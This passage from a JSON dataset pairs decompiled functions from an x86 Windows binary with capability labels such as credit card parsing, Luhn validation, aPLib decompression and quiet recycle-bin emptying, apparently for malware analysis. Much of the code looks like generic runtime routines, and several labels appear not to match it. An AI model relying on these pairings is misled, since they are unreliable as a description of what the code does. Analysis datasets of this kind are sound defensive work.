-4)) {\n        fcn.004831f0();\n        iVar3 = *extraout_ECX;\n    }\n    return iVar3 + (iVar2 + -1) * 2;\n}\n",
        "token_count": 400
    },
    "004bd190": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.004bd190(ushort *param_1, ushort param_2, char *param_3, int32_t param_4, ushort *param_5, ushort *param_6)\n\n{\n    ushort *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    ushort *puVar6;\n    ushort *puVar7;\n    ushort *puVar8;\n    int32_t iStack24;\n    \n    iStack24 = 0;\n    cVar5 = *param_3;\n    uVar3 = 0;\n    iVar4 = cVar5;\n    while (iVar4 < param_6 - param_5 >> 1) {\n        while( true ) {\n            if (0x7d < cVar5 - 1U) goto code_r0x004bd1ff;\n            param_6 = param_6 + -iVar4;\n            if (param_4 - 1U <= uVar3) break;\n            uVar3 = uVar3 + 1;\n            cVar5 = param_3[uVar3];\n            iVar4 = cVar5;\n            if (param_6 - param_5 >> 1 <= iVar4) goto code_r0x004bd1ff;\n        }\n        iStack24 = iStack24 + 1;\n    }\ncode_r0x004bd1ff:\n    puVar6 = param_5;\n    puVar7 = param_1;\n    if (param_6 != param_5) {\n        do {\n            puVar8 = puVar6 + 1;\n            *puVar7 = *puVar6;\n            puVar6 = puVar8;\n            puVar7 = puVar7 + 1;\n        } while (param_6 != puVar8);\n        iVar4 = (param_6 + (-2 - param_5) & 0xfffffffeU) + 2;\n        param_5 = param_5 + iVar4;\n        param_1 = iVar4 + param_1;\n    }\n    while (iStack24 = iStack24 + -1,  iStack24 != -1) {\n        while( true ) {\n            puVar6 = param_1 + 1;\n            *param_1 = param_2;\n            uVar2 = param_3[uVar3];\n            param_1 = puVar6;\n            if (uVar2 < '\\x01') break;\n            puVar7 = param_5;\n            puVar8 = puVar6;\n            do {\n                puVar1 = puVar7 + 1;\n                *puVar8 = *puVar7;\n                puVar7 = puVar1;\n                puVar8 = puVar8 + 1;\n            } while (puVar1 != param_5 + (uVar2 - 1 & 0xff) + 1);\n            iStack24 = iStack24 + -1;\n            param_5 = param_5 + (uVar2 - 1) + 1;\n            param_1 = puVar6 + (uVar2 - 1) + 1;\n            if (iStack24 == -1) goto joined_r0x004bd286;\n        }\n    }\njoined_r0x004bd286:\n    while (uVar3 = uVar3 - 1,  uVar3 != 0xffffffff) {\n        puVar6 = param_1 + 1;\n        *param_1 = param_2;\n        uVar2 = param_3[uVar3];\n        param_1 = puVar6;\n        if ('\\0' < uVar2) {\n            puVar7 = param_5;\n            puVar8 = puVar6;\n            do {\n                puVar1 = puVar7 + 1;\n                *puVar8 = *puVar7;\n                puVar7 = puVar1;\n                puVar8 = puVar8 + 1;\n            } while (puVar1 != param_5 + (uVar2 - 1 & 0xff) + 1);\n            param_5 = param_5 + (uVar2 - 1) + 1;\n            param_1 = puVar6 + (uVar2 - 1) + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 936
    },
    "0042d540": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d540(uint *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 == NULL) {\n        return;\n    }\n    do {\n    // switch table (80 cases) at 0x524c20\n        switch(*param_1) {\n        default:\n            goto code_r0x0042d567;\n        case 1:\n        case 2:\n        case 3:\n        case 9:\n        case 10:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n        case 0xf:\n        case 0x10:\n        case 0x11:\n        case 0x12:\n        case 0x13:\n        case 0x14:\n        case 0x15:\n        case 0x16:\n        case 0x17:\n        case 0x19:\n        case 0x1a:\n        case 0x1b:\n        case 0x1c:\n        case 0x1d:\n        case 0x1e:\n        case 0x1f:\n        case 0x20:\n        case 0x21:\n        case 0x22:\n        case 0x25:\n        case 0x26:\n        case 0x28:\n        case 0x29:\n        case 0x2a:\n        case 0x2b:\n        case 0x2d:\n        case 0x2e:\n        case 0x2f:\n        case 0x30:\n        case 0x33:\n        case 0x34:\n        case 0x35:\n        case 0x36:\n        case 0x37:\n        case 0x38:\n        case 0x39:\n        case 0x3a:\n        case 0x3b:\n        case 0x3c:\n        case 0x3d:\n        case 0x3e:\n        case 0x3f:\n        case 0x42:\n        case 0x48:\n        case 0x49:\n        case 0x4a:\n        case 0x4b:\n        case 0x4c:\n        case 0x4d:\n        case 0x4e:\n        case 0x4f:\n            break;\n        case 4:\n            *in_EAX = *in_EAX + 1;\n            break;\n        case 7:\n        case 8:\n        case 0x32:\n            param_1 = param_1[3];\n            goto code_r0x0042d563;\n        case 0x23:\n        case 0x24:\n            if (*param_1[2] == 5) {\n                *param_2 = *param_2 + 1;\n            }\n            break;\n        case 0x2c:\n        case 0x43:\n        case 0x44:\n        case 0x45:\n        case 0x46:\n            param_1 = param_1[2];\n            goto code_r0x0042d563;\n        }\n        fcn.0042d540();\n        param_1 = param_1[3];\ncode_r0x0042d563:\n    } while (param_1 != NULL);\ncode_r0x0042d567:\n    return;\n}\n",
        "token_count": 743
    },
    "0043a1c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043a1c0(int32_t *param_1)\n\n{\n    code *pcVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcStack52;\n    \n    iVar4 = 1;\n    pcVar1 = in_EAX[3];\n    while( true ) {\n        iVar2 = fcn.00438f10();\n        if ((iVar2 != 0) && (iVar2 != 5)) {\n            return 2;\n        }\n        if (iVar2 == 5) break;\n        iVar2 = (*pcVar1)(1, 10, *in_EAX, in_EAX[1]);\n        if (iVar2 != 0) {\n            return 2;\n        }\n        if (pcStack52 != NULL) {\n            iVar2 = (*pcStack52)(1, 10, *in_EAX, in_EAX[1]);\n            if (iVar2 == 7) goto code_r0x0043a2d5;\n            if (iVar2 != 8) {\n                return 2;\n            }\n        }\n        iVar4 = iVar4 + 1;\n        fcn.0043a080();\n    }\n    iVar3 = (*pcVar1)(1, 0x1a, *in_EAX, in_EAX[1]);\n    if (iVar3 != 0) {\n        return 2;\n    }\ncode_r0x0043a2d5:\n    *param_1 = iVar4;\n    return iVar2;\n}\n",
        "token_count": 348
    },
    "0043a6e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043a6e0(uint param_1, uint param_2, uint *param_3)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t extraout_EDX;\n    uint *puVar2;\n    uint *puVar3;\n    uint auStack476 [32];\n    uint auStack348 [18];\n    int32_t iStack276;\n    uint uStack272;\n    int32_t iStack252;\n    code *pcStack52;\n    int32_t iStack24;\n    uint uStack20;\n    \n    iStack24 = in_EAX;\n    uStack20 = param_2;\n    fcn.00439e90();\n    puVar2 = auStack476;\n    puVar3 = auStack348;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    while( true ) {\n        iVar1 = fcn.00438f10();\n        if (iVar1 == 5) {\n            return 5;\n        }\n        if (iVar1 != 0) break;\n        if (pcStack52 != NULL) {\n            iVar1 = (*pcStack52)(1, 1, *param_3, param_3[1], param_3, auStack348);\n            if (iVar1 == 6) {\n                param_3[3] = 0;\n                param_3[4] = iStack276 + (iStack252 >> 0x1f);\n                puVar2 = auStack476;\n                puVar3 = auStack348;\n                for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar3 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar3 = puVar3 + 1;\n                }\n                iVar1 = fcn.0043a0f0();\n                if (iVar1 != 7) {\n                    return iVar1;\n                }\n                fcn.0043a2f0();\n                fcn.0043a6d0(iStack276, uStack272);\n                *(&stack0x00000000 + extraout_EDX) = uStack272;\n                return iStack24;\n            }\n            if (iVar1 != 8) {\n                return 3;\n            }\n        }\n        fcn.0043a080();\n    }\n    return 3;\n}\n",
        "token_count": 578
    },
    "0043aa60": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043aa60(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_158h;\n    uint var_d8h;\n    \n    fcn.00439e90();\n    while (((iVar2 = fcn.00438f10(),  iVar2 == 0 || (iVar2 == 5)) && (iVar1 = (*arg_8h)(&var_158h, arg_ch),  iVar1 == 0)\n           )) {\n        if (iVar2 == 5) {\n            return 5;\n        }\n        fcn.0043a080();\n    }\n    return 3;\n}\n",
        "token_count": 153
    },
    "0043c7d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nfloat10 fcn.0043c7d0(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    float fStack20;\n    int32_t aiStack16 [4];\n    \n    uVar1 = fcn.0043e4f0(param_1, param_2, 0x515a68, aiStack16, &fStack20);\n    // switch table (6 cases) at 0x527230\n    switch(uVar1 & 7) {\n    default:\n        fStack20 = 0.0;\n        break;\n    case 1:\n    case 5:\n        fStack20 = (aiStack16[0] + 0x96) * 0x800000 | fStack20 & 0x7fffff;\n        break;\n    case 2:\n        break;\n    case 3:\n        fStack20 = INFINITY;\n        break;\n    case 4:\n        fStack20 = NAN;\n    }\n    if ((uVar1 & 8) != 0) {\n        fStack20 = fStack20 | 0x80000000;\n    }\n    return fStack20;\n}\n",
        "token_count": 254
    },
    "0042d750": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nint32_t fcn.0042d750(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    \n    pcVar2 = *(in_EAX + 0xc);\n    if (*pcVar2 != '_') {\n        if (*pcVar2 != 'n') {\n            iVar1 = fcn.0042d650();\n            iVar1 = iVar1 + 1;\n            if ((-1 < iVar1) && (pcVar2 = *(in_EAX + 0xc),  *pcVar2 == '_')) goto code_r0x0042d776;\n        }\n        return -1;\n    }\n    iVar1 = 0;\ncode_r0x0042d776:\n    *(in_EAX + 0xc) = pcVar2 + 1;\n    return iVar1;\n}\n",
        "token_count": 185
    },
    "0042de70": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nuint fcn.0042de70(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    \n    pcVar8 = *(in_EAX + 0xc);\n    if (*pcVar8 != 'L') {\n        return 0;\n    }\n    pcVar6 = pcVar8 + 1;\n    *(in_EAX + 0xc) = pcVar6;\n    cVar1 = pcVar8[1];\n    if ((cVar1 == '_') || (cVar1 == 'Z')) {\n        if (cVar1 == '_') {\n            pcVar6 = pcVar8 + 2;\n            *(in_EAX + 0xc) = pcVar6;\n            cVar1 = pcVar8[2];\n            if (cVar1 != 'Z') {\n                uVar4 = 0;\n                goto joined_r0x0042df8d;\n            }\n        }\n        *(in_EAX + 0xc) = pcVar6 + 1;\n        uVar4 = fcn.0042ffd0();\n        pcVar6 = *(in_EAX + 0xc);\n        cVar1 = *pcVar6;\n        goto joined_r0x0042df8d;\n    }\n    piVar3 = fcn.0042ed40();\n    if (piVar3 == NULL) {\n        return 0;\n    }\n    if ((*piVar3 == 0x27) && (*(piVar3[2] + 0x10) != 0)) {\n        *(in_EAX + 0x2c) = *(in_EAX + 0x2c) - *(piVar3[2] + 4);\n    }\n    pcVar6 = *(in_EAX + 0xc);\n    cVar1 = *pcVar6;\n    pcVar8 = pcVar6;\n    if (cVar1 == 'n') {\n        pcVar8 = pcVar6 + 1;\n        *(in_EAX + 0xc) = pcVar8;\n        cVar1 = pcVar6[1];\n    }\n    pcVar6 = pcVar8;\n    if (cVar1 == 'E') {\n        iVar7 = 0;\n    }\n    else {\n        do {\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            pcVar6 = pcVar6 + 1;\n            *(in_EAX + 0xc) = pcVar6;\n            cVar1 = *pcVar6;\n        } while (cVar1 != 'E');\n        iVar7 = pcVar6 - pcVar8;\n    }\n    iVar2 = *(in_EAX + 0x14);\n    if (iVar2 < *(in_EAX + 0x18)) {\n        puVar5 = iVar2 * 0x10 + *(in_EAX + 0x10);\n        puVar5[1] = 0;\n        *(in_EAX + 0x14) = iVar2 + 1;\n        if ((pcVar8 == NULL) || (iVar7 == 0)) goto code_r0x0042dfe0;\n        puVar5[1] = 0;\n        *puVar5 = 0;\n        puVar5[2] = pcVar8;\n        puVar5[3] = iVar7;\n    }\n    else {\ncode_r0x0042dfe0:\n        puVar5 = NULL;\n    }\n    uVar4 = fcn.0042d480(puVar5);\n    pcVar6 = *(in_EAX + 0xc);\n    cVar1 = *pcVar6;\njoined_r0x0042df8d:\n    if (cVar1 != 'E') {\n        return 0;\n    }\n    *(in_EAX + 0xc) = pcVar6 + 1;\n    return uVar4;\n}\n",
        "token_count": 888
    },
    "004c2e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nuint32_t fcn.004c2e40(uint32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    char cVar6;\n    uint32_t **ppuVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint uVar10;\n    int32_t *piVar11;\n    int32_t iVar12;\n    code *pcVar13;\n    ulong uVar14;\n    int32_t iStack68;\n    uint32_t *puStack40;\n    \n    ppuVar7 = fcn.004c30c0();\n    puVar2 = *ppuVar7;\n    puVar1 = param_1 + -0xc;\n    iVar12 = param_1[1] + 0xb8b1aabc + (0x432b2aff < *param_1);\n    if (iVar12 == 0 && (1 < *param_1 + 0xbcd4d500) <= -iVar12) {\n        uVar3 = param_1[-7];\n        uVar5 = -uVar3;\n        if (-1 < uVar3) {\n            uVar5 = uVar3;\n        }\n        param_1[-7] = uVar5 + 1;\n        ppuVar7[1] = ppuVar7[1] + -1;\n        if (puVar2 != puVar1) {\n            param_1[-8] = puVar2;\n            *ppuVar7 = puVar1;\n        }\n        return param_1[-2];\n    }\n    if (puVar2 == NULL) {\n        *ppuVar7 = puVar1;\n        return 0;\n    }\n    fcn.004bf910();\n    if ((puStack40 == NULL) ||\n       (fcn.004c2e40(puStack40),  iVar12 = puStack40[1] + 0xb8b1aabc + (0x432b2aff < *puStack40), \n       iVar12 != 0 || -iVar12 < (1 < *puStack40 + 0xbcd4d500))) {\n        fcn.004bf910();\n    }\n    fcn.00447fc0(puStack40[-9]);\n    fcn.004c2e40(iStack68);\n    uVar10 = *(iStack68 + -0x18);\n    uVar4 = *(iStack68 + -0x24);\n    uVar8 = fcn.00447fe0(*(iStack68 + -0x28));\n    fcn.004c2e40(uVar8);\n    fcn.004c30e0();\n    while( true ) {\n        fcn.00447c80();\n        cVar6 = fcn.00447d60(uVar10);\n        if (cVar6 != '\\0') break;\n        cVar6 = fcn.00447d60(uVar10);\n        if (cVar6 != '\\0') goto code_r0x004c3c5e;\n        fcn.00447fc0(uVar4);\n    }\n    fcn.004c32d0();\ncode_r0x004c3c5e:\n    puVar9 = fcn.004c2d80(4);\n    *puVar9 = 0x52c0b4;\n    fcn.004c3330(puVar9, 0x528938, 0x496100);\n    uVar10 = sub.msvcrt.dll_abort();\n    fcn.004c2e40(uVar10);\n    uVar14 = sub.msvcrt.dll_abort();\n    fcn.004c2fb0();\n    pcVar13 = (uVar14 >> 0x20) + 1;\n    if (pcVar13 != NULL) {\n        fcn.0043a8e0(uVar14);\n    }\n    uVar14 = fcn.004c2f10();\n    uVar10 = uVar14;\n    if (uVar14 >> 0x20 != 1) goto code_r0x004c3d3d;\n    piVar11 = fcn.004c2e40(uVar10);\n    uVar10 = (**(*piVar11 + 8))();\n    uVar8 = (*pcVar13)(2);\n    sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar8);\n    uVar8 = (*pcVar13)(2);\n    sub.msvcrt.dll_fputs(uVar10, uVar8);\n    uVar10 = (*pcVar13)(2);\n    sub.msvcrt.dll_fputc(10, uVar10);\n    fcn.004c2fb0();\n    do {\n        sub.msvcrt.dll_abort();\n        uVar10 = uVar4;\n        fcn.00446e88(uVar4);\n        fcn.004c32d0();\ncode_r0x004c3d3d:\n        fcn.004c2e40(uVar10);\n        fcn.004c2fb0();\n    } while( true );\n}\n",
        "token_count": 1136
    },
    "0042d7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint * fcn.0042d7f0(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    uint *puVar7;\n    \n    iVar6 = fcn.0042d650();\n    if (iVar6 < 1) {\n        return NULL;\n    }\n    piVar3 = *(in_EAX + 0xc);\n    if (iVar6 <= *(in_EAX + 4) - piVar3) {\n        pcVar1 = piVar3 + iVar6;\n        *(in_EAX + 0xc) = pcVar1;\n        if (((*(in_EAX + 8) & 4) != 0) && (*pcVar1 == '$')) {\n            *(in_EAX + 0xc) = pcVar1 + 1;\n        }\n        iVar4 = *(in_EAX + 0x14);\n        iVar5 = *(in_EAX + 0x18);\n        if (iVar6 < 10) {\n            if (iVar4 < iVar5) {\n                puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                puVar7[1] = 0;\n                *(in_EAX + 0x14) = iVar4 + 1;\n                if (piVar3 != NULL) goto code_r0x0042d86f;\n            }\n        }\n        else {\n            if ((*piVar3 == 0x4f4c475f) && (piVar3[1] == 0x5f4c4142)) {\n                cVar2 = *(piVar3 + 2);\n                if (((cVar2 == '.' || cVar2 == '_') || (cVar2 == '$')) && (*(piVar3 + 9) == 'N')) {\n                    *(in_EAX + 0x2c) = (*(in_EAX + 0x2c) + 0x16) - iVar6;\n                    if (iVar4 < iVar5) {\n                        puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                        *(in_EAX + 0x14) = iVar4 + 1;\n                        puVar7[1] = 0;\n                        *puVar7 = 0;\n                        puVar7[2] = \"(anonymous namespace)\";\n                        puVar7[3] = 0x15;\n                        goto code_r0x0042d882;\n                    }\n                    goto code_r0x0042d8b6;\n                }\n            }\n            if (iVar4 < iVar5) {\n                puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                puVar7[1] = 0;\n                *(in_EAX + 0x14) = iVar4 + 1;\ncode_r0x0042d86f:\n                puVar7[1] = 0;\n                *puVar7 = 0;\n                puVar7[2] = piVar3;\n                puVar7[3] = iVar6;\n                goto code_r0x0042d882;\n            }\n        }\n    }\ncode_r0x0042d8b6:\n    puVar7 = NULL;\ncode_r0x0042d882:\n    *(in_EAX + 0x28) = puVar7;\n    return puVar7;\n}\n",
        "token_count": 767
    },
    "0042dc60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint fcn.0042dc60(void)\n\n{\n    char *pcVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    if (*pcVar1 != '_') {\n        return 1;\n    }\n    *(in_EAX + 0xc) = pcVar1 + 1;\n    if (pcVar1[1] == '_') {\n        *(in_EAX + 0xc) = pcVar1 + 2;\n        iVar2 = fcn.0042d650();\n        if (iVar2 < 0) {\n            return 0;\n        }\n        if (9 < iVar2) {\n            if (**(in_EAX + 0xc) != '_') {\n                return 0;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        }\n    }\n    else {\n        iVar2 = fcn.0042d650();\n        if (iVar2 < 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 244
    },
    "0042f7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nint32_t fcn.0042f7f0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    char *pcVar3;\n    int32_t *piVar4;\n    int32_t aiStack32 [4];\n    \n    pcVar3 = *(in_EAX + 0xc);\n    aiStack32[0] = 0;\n    cVar2 = *pcVar3;\n    if ((cVar2 != 'E' && cVar2 != '\\0') && (piVar4 = aiStack32,  cVar2 != '.')) {\n        while (((cVar2 != 'R' && (cVar2 != 'O')) || (pcVar3[1] != 'E'))) {\n            iVar1 = fcn.0042ed40();\n            if (iVar1 == 0) {\n                return 0;\n            }\n            iVar1 = fcn.0042d480(0);\n            *piVar4 = iVar1;\n            if (iVar1 == 0) {\n                return 0;\n            }\n            pcVar3 = *(in_EAX + 0xc);\n            piVar4 = iVar1 + 0xc;\n            cVar2 = *pcVar3;\n            if ((cVar2 == '\\0' || cVar2 == 'E') || (cVar2 == '.')) break;\n        }\n        if (aiStack32[0] != 0) {\n            if (*(aiStack32[0] + 0xc) != 0) {\n                return aiStack32[0];\n            }\n            if (**(aiStack32[0] + 8) == 0x27) {\n                iVar1 = (*(aiStack32[0] + 8))[2];\n                if (*(iVar1 + 0x10) == 9) {\n                    *(in_EAX + 0x2c) = *(in_EAX + 0x2c) - *(iVar1 + 4);\n                    *(aiStack32[0] + 8) = 0;\n                    return aiStack32[0];\n                }\n                return aiStack32[0];\n            }\n            return aiStack32[0];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 485
    },
    "004401d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004401d0(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint16_t auStack34 [7];\n    uint uStack20;\n    \n    iVar4 = 6;\n    uStack20 = 0;\n    do {\n        while (uVar1 = *(param_2 + 4 + iVar4 * 2),  uVar1 != 0) {\n            uVar2 = uVar1 * (in_EAX & 0xffff);\n            uVar5 = (uVar2 & 0xffff) + auStack34[iVar4 + 2];\n            auStack34[iVar4 + 2] = uVar5;\n            iVar3 = (uVar2 >> 0x10) + auStack34[iVar4 + 1] + (uVar5 >> 0x10);\n            auStack34[iVar4 + 1] = iVar3;\n            auStack34[iVar4] = iVar3 >> 0x10;\n            iVar4 = iVar4 + -1;\n            if (iVar4 == 0) goto code_r0x00440239;\n        }\n        auStack34[iVar4] = 0;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\ncode_r0x00440239:\n    iVar4 = 2;\n    do {\n        *(param_1 + iVar4 * 2) = auStack34[iVar4];\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 9);\n    return;\n}\n",
        "token_count": 381
    },
    "00448d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint32_t __cdecl fcn.00448d80(uint s1, uint32_t arg_ch, uint arg_10h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t aiStack64 [7];\n    uint32_t var_20h;\n    uchar *var_1ch;\n    uint var_ch;\n    \n    aiStack64[0] = 0x448d96;\n    iVar2 = fcn.00437ed0();\n    iVar2 = -iVar2;\n    uVar3 = &fcn.00448d80::var_20h + iVar2 + 3 & 0xfffffff0;\n    var_20h = uVar3;\n    var_1ch = uVar3 + 0xc;\n    uVar5 = extraout_ECX;\n    puVar4 = var_1ch;\n    do {\n        puVar4 = puVar4 + -1;\n        *puVar4 = *(uVar5 % 10 + 0x524561);\n        bVar1 = 9 < uVar5;\n        uVar5 = uVar5 / 10;\n    } while (bVar1);\n    uVar5 = var_1ch - puVar4;\n    if (arg_ch < uVar5) {\n        uVar5 = 0xffffffff;\n    }\n    else {\n        *(&stack0xffffffcc + iVar2) = uVar5;\n        *(&stack0xffffffc8 + iVar2) = (uVar3 - uVar5) + 0xc;\n        *(&stack0xffffffc4 + iVar2) = s1;\n        *(&stack0xffffffc0 + iVar2) = 0x448df9;\n        sub.msvcrt.dll_memcpy();\n    }\n    return uVar5;\n}\n",
        "token_count": 445
    },
    "0043a0f0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043a0f0(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint *in_EAX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    code *pcStack52;\n    \n    iVar6 = 1;\n    do {\n        iVar4 = fcn.00438f10();\n        uVar5 = in_EAX[4] == *(param_2 + 0x48) + (*(param_2 + 0x60) >> 0x1f);\n        if (iVar4 != 0) {\n            return 2;\n        }\n        if (pcStack52 != NULL) {\n            iVar4 = (*pcStack52)(1, uVar5 << 2 | 2, *in_EAX, in_EAX[1]);\n            if (iVar4 == 7) {\n                *param_1 = iVar6;\n                return 7;\n            }\n            if (iVar4 != 8) {\n                return 2;\n            }\n        }\n        if (uVar5 != 0) {\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            iVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n            if (iVar6 == 0) {\n                *0x4ce004 = 0x43c000;\n                pcVar2 = 0x43bdb0;\n            }\n            else {\n                *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar6, \"__register_frame_info\");\n                *0x4ce004 = (*pcVar1)(iVar6, \"__deregister_frame_info\");\n            }\n            if (pcVar2 != NULL) {\n                (*pcVar2)(0x52e0f8, 0x56b01c);\n            }\n            uVar3 = fcn.004014c0(fcn.00401590);\n            return uVar3;\n        }\n        iVar6 = iVar6 + 1;\n        fcn.0043a080();\n    } while( true );\n}\n",
        "token_count": 592
    },
    "0043a830": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043a830(uint param_1, uint param_2, int32_t param_3, uint param_4, uint param_5)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t extraout_EDX;\n    uint *puVar2;\n    uint *puVar3;\n    uint auStack284 [32];\n    uint auStack156 [18];\n    uint uStack84;\n    uint uStack80;\n    int32_t iStack24;\n    uint uStack20;\n    \n    iStack24 = in_EAX;\n    uStack20 = param_2;\n    fcn.00439e90();\n    puVar2 = auStack284;\n    puVar3 = auStack156;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *(param_3 + 0xc) = param_4;\n    *(param_3 + 0x10) = param_5;\n    iVar1 = fcn.0043a1c0();\n    if (iVar1 != 7) {\n        return iVar1;\n    }\n    fcn.0043a2f0();\n    fcn.0043a6d0(uStack84, uStack80);\n    *(&stack0x00000000 + extraout_EDX) = uStack80;\n    return iStack24;\n}\n",
        "token_count": 349
    },
    "0043a8e0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
